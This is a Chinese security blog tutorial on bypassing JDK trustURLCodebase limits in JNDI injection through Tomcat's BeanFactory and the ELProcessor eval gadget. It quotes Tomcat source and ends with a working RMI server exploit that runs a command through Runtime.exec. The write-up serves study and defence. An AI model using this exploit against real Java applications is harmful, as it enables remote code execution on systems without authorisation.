---
title: 通过Tomcat BeanFactory 绕过高版本JDK CodeBase限制实现JNDI注入
date: 2025-04-14 10:33:52
tags:
- codebase
- tomcat
- JDK
- JNDI注入
categories:
  - [漏洞利用]
description: 本文介绍了一种绕过高版本JDK CodeBase限制的方案
---

上一篇文章我们讨论了通过Reference方法实现远程恶意类的自动加载，最终提供了一种使用本地类绕过truseURLCodeBase的方法，今天我们就来找到这样一个类，我们知道我们的远程恶意类要满足的两个条件是，首先要实现ObjectFactory接口，这是充分必要条件，还有一个充分不必要条件就是要重写javax.naming.spi.ObjectFactory方法。因为本地类的内容是我们不可控的，也就是不能去自己写静态代码块、实例代码块与无参构造方法，那么我们今天要找的本地类也就必须要实现getObjectInstance方法且有可利用的点，我们在Tomcat的源码中找到了这样一个方法，这里提供一个寻找某一个类实现类的快捷键，我们在IDEA中安Ctrl+H就可以看到所有实现了这个接口的类了。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/16da0a68c627fd17e0809e0d9e7b92ac.png)
这里我们之间看org.apache.naming.factory.BeanFactory#getObjectInstance方法
```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                    Hashtable<?,?> environment)
        throws NamingException {

        if (obj instanceof ResourceRef) {

            try {

                Reference ref = (Reference) obj;
                String beanClassName = ref.getClassName();
                Class<?> beanClass = null;
                ClassLoader tcl =
                    Thread.currentThread().getContextClassLoader();
                if (tcl != null) {
                    try {
                        beanClass = tcl.loadClass(beanClassName);
                    } catch(ClassNotFoundException e) {
                    }
                } else {
                    try {
                        beanClass = Class.forName(beanClassName);
                    } catch(ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }
                if (beanClass == null) {
                    throw new NamingException
                        ("Class not found: " + beanClassName);
                }

                BeanInfo bi = Introspector.getBeanInfo(beanClass);
                PropertyDescriptor[] pda = bi.getPropertyDescriptors();

                Object bean = beanClass.newInstance();

                /* Look for properties with explicitly configured setter */
                RefAddr ra = ref.get("forceString");
                Map<String, Method> forced = new HashMap<>();
                String value;

                if (ra != null) {
                    value = (String)ra.getContent();
                    Class<?> paramTypes[] = new Class[1];
                    paramTypes[0] = String.class;
                    String setterName;
                    int index;

                    /* Items are given as comma separated list */
                    for (String param: value.split(",")) {
                        param = param.trim();
                        /* A single item can either be of the form name=method
                         * or just a property name (and we will use a standard
                         * setter) */
                        index = param.indexOf('=');
                        if (index >= 0) {
                            setterName = param.substring(index + 1).trim();
                            param = param.substring(0, index).trim();
                        } else {
                            setterName = "set" +
                                         param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                                         param.substring(1);
                        }
                        try {
                            forced.put(param,
                                       beanClass.getMethod(setterName, paramTypes));
                        } catch (NoSuchMethodException|SecurityException ex) {
                            throw new NamingException
                                ("Forced String setter " + setterName +
                                 " not found for property " + param);
                        }
                    }
                }

                Enumeration<RefAddr> e = ref.getAll();

                while (e.hasMoreElements()) {

                    ra = e.nextElement();
                    String propName = ra.getType();

                    if (propName.equals(Constants.FACTORY) ||
                        propName.equals("scope") || propName.equals("auth") ||
                        propName.equals("forceString") ||
                        propName.equals("singleton")) {
                        continue;
                    }

                    value = (String)ra.getContent();

                    Object[] valueArray = new Object[1];

                    /* Shortcut for properties with explicitly configured setter */
                    Method method = forced.get(propName);
                    if (method != null) {
                        valueArray[0] = value;
                        try {
                            method.invoke(bean, valueArray);
                        } catch (IllegalAccessException|
                                 IllegalArgumentException|
                                 InvocationTargetException ex) {
                            throw new NamingException
                                ("Forced String setter " + method.getName() +
                                 " threw exception for property " + propName);
                        }
                        continue;
                    }

                    int i = 0;
                    for (i = 0; i<pda.length; i++) {

                        if (pda[i].getName().equals(propName)) {

                            Class<?> propType = pda[i].getPropertyType();

                            if (propType.equals(String.class)) {
                                valueArray[0] = value;
                            } else if (propType.equals(Character.class)
                                       || propType.equals(char.class)) {
                                valueArray[0] =
                                    Character.valueOf(value.charAt(0));
                            } else if (propType.equals(Byte.class)
                                       || propType.equals(byte.class)) {
                                valueArray[0] = Byte.valueOf(value);
                            } else if (propType.equals(Short.class)
                                       || propType.equals(short.class)) {
                                valueArray[0] = Short.valueOf(value);
                            } else if (propType.equals(Integer.class)
                                       || propType.equals(int.class)) {
                                valueArray[0] = Integer.valueOf(value);
                            } else if (propType.equals(Long.class)
                                       || propType.equals(long.class)) {
                                valueArray[0] = Long.valueOf(value);
                            } else if (propType.equals(Float.class)
                                       || propType.equals(float.class)) {
                                valueArray[0] = Float.valueOf(value);
                            } else if (propType.equals(Double.class)
                                       || propType.equals(double.class)) {
                                valueArray[0] = Double.valueOf(value);
                            } else if (propType.equals(Boolean.class)
                                       || propType.equals(boolean.class)) {
                                valueArray[0] = Boolean.valueOf(value);
                            } else {
                                throw new NamingException
                                    ("String conversion for property " + propName +
                                     " of type '" + propType.getName() +
                                     "' not available");
                            }

                            Method setProp = pda[i].getWriteMethod();
                            if (setProp != null) {
                                setProp.invoke(bean, valueArray);
                            } else {
                                throw new NamingException
                                    ("Write not allowed for property: "
                                     + propName);
                            }

                            break;

                        }

                    }

                    if (i == pda.length) {
                        throw new NamingException
                            ("No set method found for property: " + propName);
                    }

                }

                return bean;

            } catch (java.beans.IntrospectionException ie) {
                NamingException ne = new NamingException(ie.getMessage());
                ne.setRootCause(ie);
                throw ne;
            } catch (java.lang.IllegalAccessException iae) {
                NamingException ne = new NamingException(iae.getMessage());
                ne.setRootCause(iae);
                throw ne;
            } catch (java.lang.InstantiationException ie2) {
                NamingException ne = new NamingException(ie2.getMessage());
                ne.setRootCause(ie2);
                throw ne;
            } catch (java.lang.reflect.InvocationTargetException ite) {
                Throwable cause = ite.getCause();
                if (cause instanceof ThreadDeath) {
                    throw (ThreadDeath) cause;
                }
                if (cause instanceof VirtualMachineError) {
                    throw (VirtualMachineError) cause;
                }
                NamingException ne = new NamingException(ite.getMessage());
                ne.setRootCause(ite);
                throw ne;
            }

        } else {
            return null;
        }

    }
```

该函数接受三个重要参数，一个是我们从注册中心远程获取的Ref对新娘，一个是我们JNDI查询的name，一个是我们注册中心的上下文registryContext
该方法首先判断我么的方法是否是ResourceRef的实例对象，按照我们上一篇文章的恶意类来说，我们的Ref对象是Reference的实例对象而Reference是一个接口并没有集成其他的类，那么如果还是直接使用Reference实例的haul就不满足这个条件，代码直接就结束了，所以这里我们首先得保证我们远程注册的对象是ResourceRef的实例，那么我们之家渠道ResourceRef这个类看看
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f47ba10d795bcb3cf11226abc689cc2a.png)
注意到该类继承了Reference类，那么我们注册的远程Reference对象也可以是ResourceRef的实例对象。这就解决了第一个问题。
在org.apache.naming.factory.BeanFactory#getObjectInstance方法第124行会调用一次ResourceRef的getClassname方法，我们直接看这个方法。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7b1e710c4915c225612fa91a1396f078.png)
直接放回了变量className，我们看看怎么赋值的
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f030fd29eb22fcdcee31bf199bb96345.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/29e4acb45cff84557ab951a2911e0c3b.png)


Reference实例化的时候通过有参构造方法赋值的，那么我们在构造远程对象的时候并没有显式得构造Reference对象，所以其赋值来自于ResourceRef类实例化过程中
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/73479ec92550904a42086ab6b03bc276.png)
第105行调用了父类的构造方法，也就是如果我们传入7个参数对ResourceRef进行实例化，便会调用到Refernce的实例化过程，且第一个参数就是getClass最终返回的类名。然后就是根据该类名使用反射机制实例化该类，也就是说该类也应该是Client存在的类。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/772102d147ee1b3f1b0d32d9808a0c6a.png)
然后重点来到第151行，这里调用ref对象的get方法，传入字符串forceString，最终返回的是一个RefAddr对象，我们重点关注一下这个方法。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ef07bb3c97d99dcf0945ccf8d8c008c4.png)
这里有一个重要的对象addrs
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5254d6131c287c3c938ed160c7247b82.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/eaac54745dbc65122cb7a88b87c09a7c.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9fd25159df16cd17b8187ced78003933.png)
其实就是一个列表，其中存的数据类型为RefAddr对象，所以上面调用了其size方法获取了列表的大小，所以get方法的逻辑也就清楚了，遍历列表中的每一个元素调用其getType方法获取到type然后与我们传入的字符串比较，如果相等则返回该RefAddr对象
那么这个RefAddr对象可以通过什么方式添加呢？我在Reference类中找到了
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/411976e38790da4284fc370c4b456ef5.png)
那么再ResourceRef类中同样可以通过一样的方式添加，我们只需调用add方法，传入RefAddr对象就可以了。回到BeanFactory类，这里调用完get方法后，获得了RefAddr类型的变量，然后调用了其getContent方法，我们又来看看这个方法干了啥。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9f95756433c5f86659349b4937aaf350.png)
我们发现这是一个抽象类，没有具体的实现，所以我们使用快捷键ctrl+alt+b找一个实现类
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d5c8e3a00edcd7ba2e4326ea5633c61d.png)
这里contents来自于StringRefAddr初始化的时候传入的变量addr，注意到还有一个变量addrType通过其父类传入
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5aa8b1a6f8b49ec231f86ff22878e2af.png)
这个时候我们可以构建一个StringRefAddr对象 new StringRefAddr("addrType", "addr")，这一部分可以总结一下，创建一个ResourceRef对象，然后调用其add方法可以传入一个StringRefAddr对象，也就是
```java
ResourceRef resourceRef = new ResourceRef("ResourceClass", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
resourceRef.add(new StringRefAddr("forceString", "addr"));
```
在执行完getContent方法后会返回一个字符串也就是上面提到的addr，赋值给value，然后通过`,`分割后循环处理每一部分。针对每一部分通过`=`分割，等号前面的部分赋值给param,等号后面的部分赋值给setterName，然后以setterName作为方法名利用反射的方式获取上面提到的Class对象对应的Method对象，注意到该方法只能接受一个String类型的参数，然后讲该Method方法作为值，param作为键存入一个HashMap 变量名forced。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/73332102770d06d4aead448b40f719c1.png)

然后会调用ResourceRef#getAll方法获取实例化过程中传入的所有参数并存入枚举类型中。然后一个一个的迭代获取其addrType，直到其不等于scope、factory、auth、singleton、forceString之后进入下面的步骤，假设我们在调用ResourceRef的add方法时后设置了一个addrType，为a也就是new ResourceRef().add(new StringAddrRef("a", "地址类型"))，在202行就会调用StringRefAddr的getContents方法获取到“地址类型”赋值给value。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/20d1e2db09bcb6f00b50cc595f6c71cf.png)
然后再低207行从上面forced这个HashMap中取出a对应的Method，然后利用反射机制调用该Method的invoke方法将封装成数组的value作为参数践行调用。那么如果我找到一个本地Class，然后其有一个方法可以进行任意命令执行岂不美滋滋。。。
这个类就是`javax.el.ELProcessor` 
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9969d2f67ba634f2acd3a466363aa733.png)
使用其eval方法即可执行任意命令。所以我们的服务端写法也就出来了

```java
package com.armandhe.jnditest;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, MalformedURLException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("el", referenceWrapper);
        System.out.println("rmi://127.0.0.1/el is working");
    }
}


```
这样就不需要在客户端设置`System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);`了





















